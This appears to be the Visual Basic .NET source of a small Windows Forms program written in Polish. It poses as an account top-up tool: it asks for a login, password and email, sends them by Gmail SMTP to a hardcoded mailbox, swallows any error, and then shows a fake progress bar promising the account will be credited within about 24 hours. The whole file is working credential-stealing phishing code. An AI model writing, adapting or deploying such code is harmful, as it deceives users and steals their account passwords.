Imports System
Imports System.Threading
Imports System.Net.Mail
Public Class Form1

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Timer1.Start()

        Dim MyMailMessage As New MailMessage()
        Try
            MyMailMessage.From = New MailAddress("email")
            MyMailMessage.To.Add("email")
            MyMailMessage.Subject = ("LOL - Nowe hasło")
            MyMailMessage.Body = "Login: " + TextBox1.Text & vbCrLf + "Hasło: " + TextBox2.Text + "email: " + TextBox3.Text
            Dim SMTP As New SmtpClient("smtp.gmail.com")
            SMTP.Port = 465
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential("email", "hasło")
            SMTP.Send(MyMailMessage)
            TextBox2.Text = ""
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        ProgressBar1.Increment(1)
        If ProgressBar1.Value = 100 Then
            Label7.Text = "Konto zostanie doładowane za ok. 24 godziny."
        End If
    End Sub

    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click

    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

    End Sub
End Class